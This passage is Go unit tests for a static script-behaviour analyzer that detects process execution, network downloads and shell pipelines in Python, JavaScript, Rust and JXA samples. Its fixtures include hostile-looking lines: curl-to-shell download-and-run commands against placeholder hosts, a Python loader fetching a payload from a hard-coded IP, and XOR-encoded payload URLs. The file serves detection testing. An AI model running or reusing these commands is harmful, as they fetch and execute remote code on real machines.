func TestExtractTextPythonMultilineClassHeaderSuppressesClassBody(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "multiline-class.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			"class Container(\n" +
				"    object,\n" +
				"):\n" +
				"    import subprocess\n" +
				`    subprocess.run(["/usr/bin/must-not-run"])` + "\n",
		),
	})

	if len(graph.Operations) != 0 {
		t.Fatalf("multiline class-body behavior escaped suppression: %#v", graph.Operations)
	}
	if !hasPartialCoverageScope(graph.Coverage, "python-lexical-scope-analysis") {
		t.Fatalf("suppressed multiline class body lacks partial coverage: %#v", graph.Coverage)
	}
}

func TestExtractTextPythonMultilineDeclarationHeaderIsBounded(t *testing.T) {
	var source strings.Builder
	source.WriteString("def dormant(\n")
	for index := 0; index <= maxSemanticContinuationLines; index++ {
		source.WriteString("    argument_")
		source.WriteString(strconv.Itoa(index))
		source.WriteString(",\n")
	}
	source.WriteString("):\n")
	source.WriteString("    import subprocess\n")
	source.WriteString(`    subprocess.run(["/usr/bin/must-not-run"])`)
	source.WriteByte('\n')
	source.WriteString("import subprocess\n")
	source.WriteString(`subprocess.run(["/usr/bin/must-not-reach"])`)
	source.WriteByte('\n')

	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "bounded-header.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data:        []byte(source.String()),
	})

	if len(graph.Operations) != 0 {
		t.Fatalf("analysis continued beyond a declaration-header limit: %#v", graph.Operations)
	}
	if !hasPartialCoverageScope(graph.Coverage, "python-lexical-scope-analysis") {
		t.Fatalf("declaration-header exhaustion lacks partial coverage: %#v", graph.Coverage)
	}
}

func TestExtractTextPythonDeclarationInvalidatesEnclosingSubprocessImport(t *testing.T) {
	for name, source := range map[string]string{
		"module function": "import subprocess\n" +
			"def subprocess():\n" +
			"    pass\n" +
			`subprocess.run(["/usr/bin/must-not-run"])`,
		"module class": "import subprocess\n" +
			"class subprocess:\n" +
			"    pass\n" +
			`subprocess.run(["/usr/bin/must-not-run"])`,
		"nested function": "def outer():\n" +
			"    import subprocess\n" +
			"    def subprocess():\n" +
			"        pass\n" +
			`    subprocess.run(["/usr/bin/must-not-run"])`,
	} {
		t.Run(name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: "subprocess-rebound.py",
				Kind:        "script",
				MediaType:   "text/plain",
				Data:        []byte(source),
			})
			if len(graph.Operations) != 0 {
				t.Fatalf("def/class rebinding preserved an enclosing subprocess import: %#v", graph.Operations)
			}
			if !hasPartialCoverageScope(graph.Coverage, "python-subprocess-analysis") {
				t.Fatalf("rejected rebound subprocess call lacks partial coverage: %#v", graph.Coverage)
			}
		})
	}
}

func TestExtractTextPythonFunctionNameRebindingStopsLaterDirectCalls(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "function-rebound.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			"def fetch():\n" +
				"    pass\n" +
				"fetch = lambda: None\n" +
				"fetch()\n",
		),
	})

	if hasPythonDirectCallFeature(graph.Features, "fetch") {
		t.Fatalf("a rebound function name remained a direct-call candidate: %#v", graph.Features)
	}
}

func TestExtractTextPythonAssignmentRHSCallPrecedesNameRebinding(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "function-rhs-call.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			"def fetch():\n" +
				"    pass\n" +
				"fetch = fetch()\n" +
				"fetch()\n",
		),
	})

	count := 0
	for _, feature := range graph.Features {
		if feature.Key == "script.function_call" && feature.Value == "fetch" {
			count++
		}
	}
	if count != 1 {
		t.Fatalf("assignment RHS should retain only its pre-rebinding call, got %d: %#v", count, graph.Features)
	}
}

func TestExtractTextPythonLaterDuplicateWithdrawsEarlierCallByName(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "temporal-redefinition.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			"def fetch():\n" +
				"    pass\n" +
				"fetch()\n" +
				"def fetch():\n" +
				"    pass\n",
		),
	})

	if hasPythonDirectCallFeature(graph.Features, "fetch") {
		t.Fatalf("call-by-name survived a later ambiguous function declaration: %#v", graph.Features)
	}
	if !hasPartialCoverageScope(graph.Coverage, "python-direct-call-analysis") {
		t.Fatalf("ambiguous temporal redefinition lacks partial coverage: %#v", graph.Coverage)
	}
}

func TestExtractTextPythonNestedSameNameDeclarationIsCallAmbiguous(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "nested-redefinition.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			"def outer():\n" +
				"    def fetch():\n" +
				"        pass\n" +
				"def fetch():\n" +
				"    pass\n" +
				"fetch()\n",
		),
	})

	if hasPythonDirectCallFeature(graph.Features, "fetch") {
		t.Fatalf("call-by-name ignored a same-named nested function scope: %#v", graph.Features)
	}
	if !hasPartialCoverageScope(graph.Coverage, "python-direct-call-analysis") {
		t.Fatalf("same-named nested declaration lacks partial coverage: %#v", graph.Coverage)
	}
}

func TestExtractTextPythonLexicalScopeDepthIsBounded(t *testing.T) {
	var source strings.Builder
	for depth := 0; depth <= maxPythonLexicalScopeDepth; depth++ {
		source.WriteString(strings.Repeat("    ", depth))
		source.WriteString("def nested_")
		source.WriteString(strconv.Itoa(depth))
		source.WriteString("():\n")
	}
	source.WriteString(strings.Repeat("    ", maxPythonLexicalScopeDepth+1))
	source.WriteString("import subprocess\n")
	source.WriteString(strings.Repeat("    ", maxPythonLexicalScopeDepth+1))
	source.WriteString(`subprocess.run(["/usr/bin/must-not-run"])`)
	source.WriteByte('\n')

	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "deep-scopes.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data:        []byte(source.String()),
	})

	if len(graph.Operations) != 0 {
		t.Fatalf("analysis continued beyond the lexical scope-depth limit: %#v", graph.Operations)
	}
	if !hasPartialCoverageScope(graph.Coverage, "python-lexical-scope-analysis") {
		t.Fatalf("lexical scope-depth exhaustion lacks partial coverage: %#v", graph.Coverage)
	}
}

func TestExtractTextPythonSubprocessDoesNotProjectSysExecutable(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "subprocess.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			`import subprocess, sys` + "\n" +
				`subprocess.Popen([sys.executable, "/tmp/stage.py"])` + "\n",
		),
	})

	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationProcessExecute {
		t.Fatalf("stable subprocess call was not retained as one neutral attempt: %#v", graph.Operations)
	}
	resource, ok := graph.Operations[0].FirstBinding(behavior.ResourceRoleExecutable)
	if !ok || resource.Resource.Value != "" {
		t.Fatalf("generic source analysis projected sys.executable as a concrete interpreter: %#v", graph.Operations)
	}
	if graph.Operations[0].Qualifiers["unresolved_executable"] == "" {
		t.Fatalf("sys.executable uncertainty was not explicit: %#v", graph.Operations[0])
	}
}

func TestExtractTextPythonSubprocessSupportsClosedMethodKeywordSet(t *testing.T) {
	for name, source := range map[string]string{
		"Popen":        `subprocess.Popen(["/usr/bin/id"], start_new_session=True)`,
		"call":         `subprocess.call(["/usr/bin/id"], timeout=1)`,
		"check_call":   `subprocess.check_call(["/usr/bin/id"], timeout=1)`,
		"check_output": `subprocess.check_output(["/usr/bin/id"], input=b"x", timeout=1)`,
	} {
		t.Run(name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: "subprocess.py",
				Kind:        "script",
				MediaType:   "text/plain",
				Data:        []byte("import subprocess\n" + source),
			})
			assertOperation(t, graph, behavior.OperationProcessExecute, "file", "/usr/bin/id")
		})
	}
}

func TestExtractTextPythonSubprocessGrammarIsBounded(t *testing.T) {
	elements := make([]string, maxTextStringExpressionArguments+1)
	for index := range elements {
		elements[index] = `"x"`
	}
	deep := strings.Repeat("(", maxTextStringExpressionDepth+1) +
		`["echo"]` +
		strings.Repeat(")", maxTextStringExpressionDepth+1)

	for name, source := range map[string]string{
		"argv cardinality": `subprocess.run([` + strings.Join(elements, ",") + `])`,
		"nesting":          `subprocess.run(` + deep + `)`,
	} {
		t.Run(name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: "subprocess.py",
				Kind:        "script",
				MediaType:   "text/plain",
				Data:        []byte("import subprocess\n" + source),
			})
			if len(graph.Operations) != 0 {
				t.Fatalf("over-limit subprocess syntax became behavior: %#v", graph.Operations)
			}
			if !hasPartialCoverageScope(graph.Coverage, "python-subprocess-analysis") {
				t.Fatalf("over-limit subprocess syntax lacks partial coverage: %#v", graph.Coverage)
			}
		})
	}
}

func TestExtractTextURLopenQueryDataRemainsConnect(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "client.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data:        []byte("import urllib.request\n" + `urllib.request.urlopen("https://urllib-query.example/api?data=1")`),
	}

	ExtractText(&graph, content)

	assertOperationKind(t, graph, "network.connect")
	assertNoOperationKind(t, graph, "network.upload")
	assertShellCommandNetwork(t, graph, "https://urllib-query.example/api?data=1")
}

func TestExtractTextURLopenDataArgumentIsUpload(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "client.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data:        []byte("import urllib.request\n" + `urllib.request.urlopen("https://urllib-upload.example/api", data=b"payload")`),
	}

	ExtractText(&graph, content)

	assertOperationKind(t, graph, "network.upload")
	assertShellCommandNetwork(t, graph, "https://urllib-upload.example/api")
}

func TestExtractTextResolvesPythonFStringNetworkDestination(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			`import requests` + "\n" +
				`host1 = "95.164.17.24"` + "\n" +
				`host2 = f"http://{host1}:1224"` + "\n" +
				`sType = "5346"` + "\n" +
				`gType = "root"` + "\n" +
				`requests.get(host2 + "/payload/" + sType + "/" + gType, allow_redirects=True)` + "\n",
		),
	}

	ExtractText(&graph, content)

	assertShellCommandNetwork(t, graph, "http://95.164.17.24:1224/payload/5346/root")
}

func TestExtractTextDynamicPythonFStringNetworkDestinationUnresolved(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			`import requests` + "\n" +
				`host2 = f"http://{host1}:1224"` + "\n" +
				`requests.get(host2 + "/payload")` + "\n",
		),
	}

	ExtractText(&graph, content)

	if len(graph.Network) != 1 {
		t.Fatalf("expected unresolved network operation, got %#v", graph.Network)
	}
	if len(networkOperationDestinations(graph)) != 0 {
		t.Fatalf("dynamic f-string should not produce a concrete destination: %#v", graph.Network)
	}
}

func TestExtractTextDirectPythonFStringNetworkDestinationDoesNotBecomePartialURL(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID: "node-0001", LogicalPath: "loader.py", Kind: "script", MediaType: "text/plain",
		Data: []byte("import urllib.request as request\n" +
			`request.urlretrieve(f"https://downloads.example/tool-{platform}-{arch}.zip", output)` + "\n"),
	})

	if len(graph.Network) != 1 {
		t.Fatalf("dynamic destination lost the proven network API call: operations=%#v network=%#v", graph.Operations, graph.Network)
	}
	for _, operation := range graph.Operations {
		if operation.Kind != behavior.OperationNetworkConnect && operation.Kind != behavior.OperationNetworkDownload {
			continue
		}
		resource := operation.RequiredResource()
		if resource.Kind != behavior.ResourceNetworkEndpoint || resource.Value != "" {
			t.Fatalf("dynamic URL template became a fabricated exact destination: %#v", operation)
		}
	}
	for _, feature := range graph.Features {
		if strings.Contains(feature.Value, "https://downloads.example/tool-") {
			t.Fatalf("dynamic URL fragment became an exact static URL: %#v", feature)
		}
	}
}

func TestExtractTextDirectJavaScriptTemplateNetworkDestinationDoesNotBecomePartialURL(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID: "node-0001", LogicalPath: "loader.js", Kind: "script", MediaType: "text/plain",
		Data: []byte("const response = fetch(`https://downloads.example/tool-${platform}-${arch}.zip`);\n"),
	})

	if len(graph.Network) != 1 {
		t.Fatalf("dynamic destination lost the proven network API call: operations=%#v network=%#v", graph.Operations, graph.Network)
	}
	for _, operation := range graph.Operations {
		if operation.Kind != behavior.OperationNetworkConnect && operation.Kind != behavior.OperationNetworkDownload {
			continue
		}
		resource := operation.RequiredResource()
		if resource.Kind != behavior.ResourceNetworkEndpoint || resource.Value != "" {
			t.Fatalf("dynamic template became a fabricated exact destination: %#v", operation)
		}
	}
	for _, feature := range graph.Features {
		if strings.Contains(feature.Value, "https://downloads.example/tool-") {
			t.Fatalf("dynamic URL fragment became an exact static URL: %#v", feature)
		}
	}
}

func TestExtractTextDoesNotBindUnprovedRustDecoderOutput(t *testing.T) {
	var graph behavior.Graph
	key := []byte{42, 23, 233}
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "decimal.rs",
		Kind:        "text",
		MediaType:   "text/plain",
		Data: []byte(
			`use curl::easy::Easy;` + "\n" +
				`use std::process::Command;` + "\n" +
				`fn run() {` + "\n" +
				`  let mut easy = Easy::new();` + "\n" +
				`  easy.url(&Decimal::parse_fn(&vec![` + rustXOREncodedList("https://rust.example/payload", key) + `])).unwrap();` + "\n" +
				`  Command::new(Decimal::parse_fn(&vec![` + rustXOREncodedList("/tmp/rust-payload", key) + `])).spawn();` + "\n" +
				`}` + "\n" +
				`fn parse_fn(comm: &Vec<u8>) -> String {` + "\n" +
				`  let xs: [u8; 3] = [` + byteList(key) + `];` + "\n" +
				`  String::new()` + "\n" +
				`}` + "\n",
		),
	}

	ExtractText(&graph, content)

	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationProcessExecute ||
		graph.Operations[0].Support != behavior.SupportHeuristic ||
		len(graph.Operations[0].ResourceBindings) != 1 || graph.Operations[0].ResourceBindings[0].Resource.Value != "" ||
		len(graph.Network) != 0 {
		t.Fatalf("the exact Command terminal should stay heuristic and its unproved decoder output unresolved: operations=%#v network=%#v", graph.Operations, graph.Network)
	}
}

func TestExtractTextIgnoresRustDecoderInDocumentation(t *testing.T) {
	var graph behavior.Graph
	key := []byte{42, 23, 233}
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "docs/decimal.rs",
		Kind:        "text",
		MediaType:   "text/plain",
		Role:        "documentation",
		Data: []byte(
			`example: easy.url(&Decimal::parse_fn(&vec![` + rustXOREncodedList("https://rust.example/payload", key) + `]));` + "\n" +
				`let xs: [u8; 3] = [` + byteList(key) + `];` + "\n",
		),
	}

	ExtractText(&graph, content)

	if len(graph.Features) != 0 || len(graph.Operations) != 0 || len(graph.Network) != 0 {
		t.Fatalf("documentation rust snippets should not produce semantic behavior: features=%#v operations=%#v network=%#v", graph.Features, graph.Operations, graph.Network)
	}
}

func TestExtractTextIgnoresNonRuntimeSourceRoles(t *testing.T) {
	for _, role := range []string{"documentation", "test", "fixture", "vendor", "packaged-content"} {
		t.Run(role, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: "loader.py",
				Kind:        "text",
				MediaType:   "text/plain",
				Role:        role,
				Data: []byte(
					"import requests\n" +
						"import subprocess\n" +
						"requests.get('https://suppressed.example/payload')\n" +
						"subprocess.run(['/bin/sh', '-c', 'id'])\n",
				),
			})
			if len(graph.Features) != 0 || len(graph.Operations) != 0 || len(graph.Network) != 0 {
				t.Fatalf("%s source emitted semantic behavior: features=%#v operations=%#v network=%#v", role, graph.Features, graph.Operations, graph.Network)
			}
		})
	}
}

func TestExtractTextNetworkDestinationIgnoresHeaderValues(t *testing.T) {
	tests := []struct {
		name      string
		path      string
		body      string
		want      string
		notWanted []string
	}{
		{
			name: "python requests",
			path: "client.py",
			body: "import requests\n" + `requests.get("https://real-python.example/p", headers={"Host": "header-python.example", "Referer": "https://referer-python.example/"})`,
			want: "https://real-python.example/p",
			notWanted: []string{
				"header-python.example",
				"https://referer-python.example/",
			},
		},
		{
			name: "javascript fetch",
			path: "client.js",
			body: `fetch("https://real-js.example/p", {headers: {"Host": "header-js.example", "Referer": "https://referer-js.example/"}})`,
			want: "https://real-js.example/p",
			notWanted: []string{
				"header-js.example",
				"https://referer-js.example/",
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: tt.path,
				Kind:        "script",
				MediaType:   "text/plain",
				Data:        []byte(tt.body),
			}

			ExtractText(&graph, content)

			assertShellCommandNetwork(t, graph, tt.want)
			for _, destination := range tt.notWanted {
				assertNetworkDestinationAbsent(t, graph, destination)
			}
		})
	}
}

func TestExtractTextCompactsLongLineEvidence(t *testing.T) {
	var graph behavior.Graph
	prefix := strings.Repeat("const ignored = 1;", 100)
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "bundle.js",
		Kind:        "script",
		MediaType:   "text/plain",
		Data:        []byte(prefix + `fetch("https://long-line.example/api")`),
	}

	ExtractText(&graph, content)

	assertShellCommandNetwork(t, graph, "https://long-line.example/api")
	for _, evidence := range graph.Evidence {
		if evidence.Kind != "text-line" {
			continue
		}
		if len([]rune(evidence.Value)) > maxTextEvidenceValueRunes+3 {
			t.Fatalf("text evidence was not compacted: %d runes", len([]rune(evidence.Value)))
		}
		if !strings.HasSuffix(evidence.Value, "...") {
			t.Fatalf("compacted evidence should include truncation marker: %#q", evidence.Value)
		}
		return
	}
	t.Fatalf("missing text-line evidence: %#v", graph.Evidence)
}

func TestExtractTextResolvesJavaScriptExecCommandVariable(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.js",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			`const child_process = require("child_process");` + "\n" +
				`const cmd = "curl https://js-cmd.example/payload | sh";` + "\n" +
				`child_process.exec(cmd);` + "\n",
		),
	}

	ExtractText(&graph, content)

	assertShellCommandNetwork(t, graph, "https://js-cmd.example/payload")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 {
		t.Fatalf("resolved exec command should produce one pipes-to relation: %#v", graph.Relations)
	}
}

func TestExtractTextDoesNotTreatJavaScriptSpawnArgsAsShell(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.js",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			`const child_process = require("child_process");` + "\n" +
				`child_process.spawn("curl", ["https://spawn-argv.example/payload", "|", "sh"]);`,
		),
	}

	ExtractText(&graph, content)

	assertShellCommandNetwork(t, graph, "https://spawn-argv.example/payload")
	if hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("spawn argv pipe token should not produce shell pipeline relation: %#v", graph.Relations)
	}
}

func TestExtractTextResolvesImportedJavaScriptProcessBinding(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.js",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			`import { spawnSync } from "node:child_process";` + "\n" +
				`spawnSync("/bin/zsh", ["-c", "curl -fsSL https://bound.example/loader.sh | zsh"]);` + "\n",
		),
	}

	ExtractText(&graph, content)

	assertOperation(t, graph, "interpreter.invoke", "interpreter", "zsh")
	assertOperation(t, graph, "network.download", "network-destination", "https://bound.example/loader.sh")
}

func TestExtractTextResolvesAliasedCommonJSProcessBinding(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.js",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			`const { execSync: run } = require("child_process");` + "\n" +
				`run("curl -fsSL https://alias.example/loader.sh | zsh");` + "\n",
		),
	}

	ExtractText(&graph, content)

	assertShellCommandNetwork(t, graph, "https://alias.example/loader.sh")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 {
		t.Fatalf("aliased execSync should preserve shell semantics: %#v", graph.Relations)
	}
}

func TestExtractTextResolvesJavaScriptProcessModuleBindings(t *testing.T) {
	tests := []struct {
		name string
		body string
		url  string
	}{
		{
			name: "same-line CommonJS module",
			body: `const cp = require("node:child_process"); ` +
				`cp.exec("curl -fsSL https://module.example/loader.sh | zsh");`,
			url: "https://module.example/loader.sh",
		},
		{
			name: "namespace import",
			body: `import * as cp from "child_process"; ` +
				`cp.spawnSync("/bin/zsh", ["-c", "curl -fsSL https://namespace.example/loader.sh | zsh"]);`,
			url: "https://namespace.example/loader.sh",
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: "loader.js",
				Kind:        "script",
				MediaType:   "text/plain",
				Data:        []byte(test.body),
			})

			assertShellCommandNetwork(t, graph, test.url)
			assertOperation(t, graph, "interpreter.invoke", "interpreter", "zsh")
		})
	}
}

func TestExtractTextRejectsUnboundJavaScriptProcessLookalikes(t *testing.T) {
	tests := []struct {
		name string
		body string
	}{
		{
			name: "RegExp exec",
			body: `const pattern = /x/; pattern.exec("curl https://regexp-decoy.example/p | sh");`,
		},
		{
			name: "unrelated module",
			body: `const cp = require("unrelated"); cp.exec("curl https://module-decoy.example/p | sh");`,
		},
		{
			name: "binding text in string",
			body: `const marker = "const cp = require('child_process')"; cp.exec("curl https://string-decoy.example/p | sh");`,
		},
		{
			name: "binding text in comment",
			body: "// const cp = require(\"child_process\");\n" +
				`cp.exec("curl https://comment-decoy.example/p | sh");`,
		},
		{
			name: "unbound member spawn",
			body: `runner.spawn("curl", ["https://spawn-decoy.example/p"]);`,
		},
		{
			name: "unbound named spawn",
			body: `spawnSync("/bin/zsh", ["-c", "curl https://named-spawn-decoy.example/p | zsh"]);`,
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: "loader.js",
				Kind:        "script",
				MediaType:   "text/plain",
				Data:        []byte(test.body),
			})
			if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
				t.Fatalf("unproved process lookalike was promoted: operations=%#v relations=%#v", graph.Operations, graph.Relations)
			}
		})
	}
}

func TestExtractTextInvalidatesJavaScriptProcessBindings(t *testing.T) {
	tests := []struct {
		name string
		body string
	}{
		{
			name: "module reassignment",
			body: `const cp = require("child_process"); cp = replacement; ` +
				`cp.exec("curl https://reassigned-decoy.example/p | sh");`,
		},
		{
			name: "module alias",
			body: `const cp = require("child_process"); const alias = cp; ` +
				`cp.exec("curl https://aliased-decoy.example/p | sh");`,
		},
		{
			name: "method overwrite",
			body: `const cp = require("child_process"); cp.exec = replacement; ` +
				`cp.exec("curl https://overwritten-decoy.example/p | sh");`,
		},
		{
			name: "bound name used as property",
			body: `const cp = require("child_process"); ` +
				`holder.cp.exec("curl https://property-decoy.example/p | sh");`,
		},
		{
			name: "named binding reassignment",
			body: `const { exec: run } = require("child_process"); run = replacement; ` +
				`run("curl https://named-decoy.example/p | sh");`,
		},
		{
			name: "duplicate shadow",
			body: `const cp = require("child_process"); const cp = require("child_process"); ` +
				`cp.exec("curl https://shadow-decoy.example/p | sh");`,
		},
		{
			name: "unsupported member shadow",
			body: `const { exec: run } = require("child_process"); const { fork: run } = require("child_process"); ` +
				`run("curl https://unsupported-shadow-decoy.example/p | sh");`,
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: "loader.js",
				Kind:        "script",
				MediaType:   "text/plain",
				Data:        []byte(test.body),
			})
			if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
				t.Fatalf("invalidated process binding was promoted: operations=%#v relations=%#v", graph.Operations, graph.Relations)
			}
		})
	}
}

func TestExtractTextRequiresExactJavaScriptProcessModuleGrammar(t *testing.T) {
	tests := []string{
		`import { spawnSync } from "unrelated"; const moduleName = "child_process";
spawnSync("/bin/zsh", ["-c", "curl https://decoy.example/p | zsh"]);`,
		`const { spawnSync } = require(moduleName); const marker = "child_process";
spawnSync("/bin/zsh", ["-c", "curl https://decoy.example/p | zsh"]);`,
		`const { SpawnSync } = require("child_process");
SpawnSync("/bin/zsh", ["-c", "curl https://case-decoy.example/p | zsh"]);`,
		`import { exec AS run } from "child_process";
run("curl https://keyword-case-decoy.example/p | sh");`,
	}
	for _, source := range tests {
		var graph behavior.Graph
		ExtractText(&graph, artifact.Content{
			NodeID:      "node-0001",
			LogicalPath: "loader.js",
			Kind:        "script",
			MediaType:   "text/plain",
			Data:        []byte(source),
		})
		if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
			t.Fatalf("non-child_process declaration was promoted: operations=%#v relations=%#v", graph.Operations, graph.Relations)
		}
	}
}

func TestExtractTextDoesNotLeakFunctionLocalJavaScriptProcessBinding(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.js",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(`function configure() {
  const { spawnSync } = require("child_process");
}
spawnSync("/bin/zsh", ["-c", "curl https://decoy.example/p | zsh"]);`),
	})
	if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
		t.Fatalf("function-local binding escaped its scope: operations=%#v relations=%#v", graph.Operations, graph.Relations)
	}
}

func TestExtractTextInheritsStableOuterJavaScriptProcessBinding(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "extension.js",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(`const cp = require("child_process");
function activate() {
  cp.exec("curl https://outer-binding.example/p | sh");
}`),
	})
	assertShellCommandNetwork(t, graph, "https://outer-binding.example/p")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 {
		t.Fatalf("stable outer binding did not preserve the shell pipeline: %#v", graph.Relations)
	}
}

func TestExtractTextBoundsJavaScriptProcessBindings(t *testing.T) {
	var imports []string
	for index := 0; index < maxJavaScriptProcessBindings+1; index++ {
		imports = append(imports, fmt.Sprintf("spawnSync as run%d", index))
	}
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.js",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			"import { " + strings.Join(imports, ", ") + ` } from "child_process";` + "\n" +
				fmt.Sprintf(`run%d("/bin/zsh", ["-c", "curl https://omitted.example/p | zsh"]);`, maxJavaScriptProcessBindings),
		),
	}

	ExtractText(&graph, content)

	if len(graph.Operations) != 0 {
		t.Fatalf("binding beyond the cap was correlated: %#v", graph.Operations)
	}
	for _, coverage := range graph.Coverage {
		if coverage.AnalysisArea == "javascript-process-binding-analysis" && coverage.Status == "partial" {
			return
		}
	}
	t.Fatalf("binding cap was not disclosed: %#v", graph.Coverage)
}

func TestExtractTextDisclosesAdditionalSameLineJavaScriptProcessCalls(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.js",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(`const cp = require("child_process"); ` +
			`cp.execFileSync("/tmp/one"); cp.execFileSync("/tmp/two");`),
	})

	var executions []behavior.ModeledOperation
	for _, operation := range graph.Operations {
		if operation.Kind == behavior.OperationProcessExecute {
			executions = append(executions, operation)
		}
	}
	if len(executions) != 1 || executions[0].RequiredResource().Value != "/tmp/one" {
		t.Fatalf("same-line process calls were not retained conservatively: %#v", graph.Operations)
	}
	for _, coverage := range graph.Coverage {
		if coverage.AnalysisArea == "javascript-process-command-analysis" &&
			coverage.Status == "partial" &&
			strings.Contains(coverage.Detail, "only the first call") {
			return
		}
	}
	t.Fatalf("additional same-line process call was not disclosed: %#v", graph.Coverage)
}

func TestExtractTextRequiresTrustedJXAHostForDoShellScript(t *testing.T) {
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.js",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			`const app = Application.currentApplication();` + "\n" +
				`app.includeStandardAdditions = true;` + "\n" +
				`app.doShellScript("curl https://jxa-cmd.example/payload | osascript -l JavaScript");` + "\n",
		),
	}

	var ordinaryJavaScript behavior.Graph
	ExtractText(&ordinaryJavaScript, content)
	for _, operation := range ordinaryJavaScript.Operations {
		if operation.Kind == behavior.OperationProcessExecute || operation.Kind == behavior.OperationNetworkDownload {
			t.Fatalf("JXA-looking JavaScript acquired osascript semantics without a trusted host: %#v", ordinaryJavaScript.Operations)
		}
	}
	if countRelationKind(ordinaryJavaScript.Relations, behavior.RelationPipesTo) != 0 {
		t.Fatalf("JXA-looking JavaScript acquired a pipes-to relation without a trusted host: %#v", ordinaryJavaScript.Relations)
	}

	content.SemanticLanguage = "jxa"
